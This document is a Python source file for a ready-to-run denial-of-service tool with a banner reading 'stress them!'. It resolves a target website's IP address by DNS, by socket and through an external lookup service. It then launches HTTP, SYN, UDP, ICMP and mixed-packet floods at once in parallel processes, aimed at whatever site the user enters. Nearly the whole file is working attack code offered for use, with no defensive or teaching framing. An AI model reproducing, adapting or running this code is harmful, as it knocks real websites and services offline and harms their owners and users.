import socket
import dns.resolver
import requests
import threading
from scapy.all import IP, TCP, UDP, ICMP, send
import random
import socket as sock
import re
from urllib.parse import urlparse
from multiprocessing import Process

# ASCII Art Banner
def display_banner():
    print("""
______________¶¶¶
_____________¶¶_¶¶¶¶
____________¶¶____¶¶¶
___________¶¶¶______¶¶
___________¶¶¶_______¶¶
__________¶¶¶¶________¶¶
__________¶_¶¶_________¶¶                    stress them!
__________¶__¶¶_________¶¶____¶¶               made by @pornsite
__________¶__¶¶__________¶¶¶¶¶¶¶
_________¶¶__¶¶¶______¶¶¶¶¶¶___¶
_________¶¶___¶¶__¶¶¶¶¶¶__¶¶
_______¶¶_¶____¶¶¶¶________¶¶
______¶¶__¶¶___¶¶__________¶¶
_____¶¶____¶¶___¶¶__________¶¶
___¶¶_______¶¶___¶¶_________¶¶
___¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶_________¶
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶________¶¶
¶¶__¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶______¶¶
¶¶¶¶¶___¶______¶___¶¶¶¶¶_____¶¶
________¶¶¶¶¶¶¶¶______¶¶¶¶¶_¶¶
______¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶
______¶¶¶¶¶¶¶¶¶¶¶¶
______¶__¶¶_¶¶¶¶¶¶
_____¶¶______¶___¶
_____¶¶_____¶¶___¶
_____¶______¶¶___¶
____¶¶______¶¶___¶¶
____¶¶______¶¶___¶¶
___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
__¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶
__¶¶________¶¶¶____¶¶
____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
""")

# Function to validate if the resolved IP is valid
def is_valid_ip(ip):
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return ip_pattern.match(ip) is not None

# Method 1: DNS Resolution using dnspython
def dns_resolver(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        for ipval in result:
            return str(ipval)
    except Exception as e:
        print(f"DNS Resolver failed: {e}")
    return None

# Method 2: Socket Method for direct resolution
def socket_resolver(domain):
    try:
        return socket.gethostbyname(domain)
    except Exception as e:
        print(f"Socket Resolver failed: {e}")
    return None

# Method 3: Using external services for IP resolution
def external_service_resolver(domain):
    try:
        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}")
        ip = re.search(r'\d+\.\d+\.\d+\.\d+', response.text)
        if ip:
            return ip.group()
    except Exception as e:
        print(f"External Service Resolver failed: {e}")
    return None

# Comprehensive IP retrieval function
def get_advanced_ip(domain):
    parsed_url = urlparse(domain)
    clean_domain = parsed_url.netloc if parsed_url.netloc else domain

    # Try DNS Resolution
    ip = dns_resolver(clean_domain)
    if ip and is_valid_ip(ip):
        print(f"IP Retrieved via DNS: {ip}")
        return ip

    # Try Socket Resolution
    ip = socket_resolver(clean_domain)
    if ip and is_valid_ip(ip):
        print(f"IP Retrieved via Socket: {ip}")
        return ip

    # Try External Service Resolution
    ip = external_service_resolver(clean_domain)
    if ip and is_valid_ip(ip):
        print(f"IP Retrieved via External Service: {ip}")
        return ip

    print("IP retrieval failed using all methods.")
    return None

# Function for HTTP Flood attack
def http_flood(target_url):
    try:
        while True:
            requests.get(target_url)
            print(f"HTTP request sent to {target_url}")
    except Exception as e:
        print(f"Error during HTTP Flood: {e}")

# Function for SYN Flood attack using scapy to craft raw TCP SYN packets
def syn_flood(target_ip, target_port=80):
    try:
        while True:
            ip = IP(dst=target_ip)
            tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags='S')
            packet = ip / tcp
            send(packet, verbose=False)
            print(f"SYN packet sent to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Error during SYN Flood: {e}")

# Function for UDP Flood attack
def udp_flood(target_ip, target_port_range=(80, 65535)):
    try:
        client = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
        data = random._urandom(1024)  # Random payload
        while True:
            target_port = random.randint(target_port_range[0], target_port_range[1])
            client.sendto(data, (target_ip, target_port))
            print(f"UDP packet sent to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Error during UDP Flood: {e}")

# Function for ICMP Flood (Ping Flood)
def icmp_flood(target_ip):
    try:
        while True:
            ip = IP(dst=target_ip)
            icmp_packet = ip / ICMP()
            send(icmp_packet, verbose=False)
            print(f"ICMP packet sent to {target_ip}")
    except Exception as e:
        print(f"Error during ICMP Flood: {e}")

# Function for mixed packet attack - combining different packet types
def mixed_flood(target_ip, target_port_range=(80, 65535)):
    try:
        while True:
            ip = IP(dst=target_ip)
            packet_type = random.choice(['SYN', 'UDP', 'ICMP'])
            
            if packet_type == 'SYN':
                tcp = TCP(sport=random.randint(1024, 65535), dport=random.randint(target_port_range[0], target_port_range[1]), flags='S')
                packet = ip / tcp
                print(f"MIXED: SYN packet sent to {target_ip}")
            elif packet_type == 'UDP':
                udp_packet = UDP(sport=random.randint(1024, 65535), dport=random.randint(target_port_range[0], target_port_range[1]))
                packet = ip / udp_packet
                print(f"MIXED: UDP packet sent to {target_ip}")
            elif packet_type == 'ICMP':
                icmp_packet = ip / ICMP()
                packet = icmp_packet
                print(f"MIXED: ICMP packet sent to {target_ip}")
            
            send(packet, verbose=False)
    except Exception as e:
        print(f"Error during Mixed Flood: {e}")

# Main function to retrieve IP and launch the ultimate attack
def perform_ddos(target_site):
    # Step 1: Retrieve the IP address of the target site
    target_ip = get_advanced_ip(target_site)
    if not target_ip:
        print("Could not retrieve IP. Exiting.")
        return

    print(f"Target IP resolved: {target_ip}")
    print(f"Launching Ultimate DDoS attacks on {target_ip}")

    # Step 2: Launching the attacks concurrently using multiprocessing for maximum power

    # Launch HTTP Flood in a new process
    http_process = Process(target=http_flood, args=(f"http://{target_site}",))
    http_process.start()

    # Launch SYN Flood in a new process
    syn_process = Process(target=syn_flood, args=(target_ip,))
    syn_process.start()

    # Launch UDP Flood in a new process with a wide range of ports
    udp_process = Process(target=udp_flood, args=(target_ip,))
    udp_process.start()

    # Launch ICMP Flood in a new process (Ping flood)
    icmp_process = Process(target=icmp_flood, args=(target_ip,))
    icmp_process.start()

    # Launch Mixed Flood in a new process for unpredictable packets
    mixed_process = Process(target=mixed_flood, args=(target_ip,))
    mixed_process.start()

if __name__ == '__main__':
    # Display ASCII banner
    display_banner()

    # Ask for the target website
    target_site = input("Enter Target Website URL: ")

    # Perform the DDoS attack on the target website
    perform_ddos(target_site)
